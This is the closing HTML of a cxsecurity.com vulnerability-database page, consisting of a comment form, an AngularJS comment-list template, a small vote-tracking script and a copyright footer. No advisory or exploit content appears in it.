</div>
<div id="thanksVote">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you vote!</strong></h4></div>
</div>
<div id="thanksComm">
<BR>&nbsp;<BR><div class="alert alert-success" style="background-color: #556B2F;">
<h4><strong>Thanks for you comment!</strong><br>Your message is in quarantine 48 hours.</h4></div>
</div></CENTER></div></div></div>
<div id="cWlb">
<div class="well well-sm"><input name="wlb" value="2016050136" type="hidden">
<fieldset>
<legend>Comment it here.</legend>
<div class="form-group form-horizontal">
<label for="inputNick" class="col-lg-1 control-label">Nick (*)</label>
<div class="col-lg-11"><input name="n" class="form-control" id="inputNick" placeholder="Nick" style="background-color: black;" onchange="document.getElementById('commCaptcha').style.display='block';"></div></div>
<div class="form-group form-horizontal">
<label for="inputEmail" class="col-lg-1 control-label">Email (*)</label>
<div class="col-lg-11"><input name="e" class="form-control" id="inputEmail" placeholder="Email" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="inputYoutube" class="col-lg-1 control-label">Video </label>
<div class="col-lg-11"><input name="v" class="form-control" id="inputVideo" placeholder="Link to Youtube" style="background-color: black;"></div></div>
<div class="form-group form-horizontal">
<label for="textArea" class="col-lg-1 control-label">Text (*)</label>
<div class="col-lg-11">
<textarea name="c" class="form-control" rows="6" id="inputComment" style="background-color: black;"></textarea></div></div>
<div class="form-group form-horizontal">
<div class="col-lg-12" id="commCaptcha" class="collapse"><BR>
<CENTER><div id="Recaptcha1"></div><BR>
<small>(*) - <cite title="requi">required fields. </cite></small> &nbsp;
<button type="reset" class="btn btn-default" style="background-color: transparent; margin-left: 0px; margin-right: 0px;">Cancel</button>
<button type="submit" id="wysl"  style="background-color: black; margin-left: 0px; margin-right: 0px;" class="btn btn-default" onclick="comIt()">Submit</button>
</CENTER>
</div></div></fieldset></div></div>
<div ng-app="ui.bootstrap.demo" ng-controller="myCtrl">
<div ng-repeat="x in comments">
<div class="well well-sm">
<table width="100%"><TR><TD width="7%"><div ng-bind-html="x.video"></div></TD><TD style="max-width: 100%;overflow: visible;"><div align="left" class="breakcx" id="breakcx"><U><b>{{ x.nick }}</b></U> <img width="20" height="14" ng-src="https://cxsecurity.com/images/flags/{{ x.country }}.png"> | <U>Date:</U> {{ x.ux  * 1000 | date:'yyyy-MM-dd' }} <I>{{ x.ux  * 1000 | date:'HH:mm' }}</I> CET+1<HR style="padding: 0px; margin: 5px;"><DIV style="white-space: pre-wrap;">{{ x.comment }}</DIV>
</div>
</TD></TR></table>
</div>
</div><button type="button" id="shomor" class="btn btn-link btn-block" ng-click="getNextCom()">Show all comments</button></div></div></div></CENTER>
</TD></TR></TABLE>
<script>
$("#thanksComm").hide(); $("#cWLb").hide(); $("#thanksVote").hide(); $("#commCaptcha").hide();
if (localStorage.vote2016050136==1) {             
document.getElementById('voteCaptcha').style.display = 'none'; document.getElementById("dodatnie").disabled = true; document.getElementById("ujemne").disabled = true;
 }</script><HR>
Copyright <b>2021</b>, cxsecurity.com<P>&nbsp;
    </TD>
    <TD id='boki'></TD>
    <TD width="6%"></TD>
	</TR>
</TABLE>
<a href="#" class="back-to-top">Back to Top</a>
    </DIV>
    </DIV>
</BODY>
</HTML>
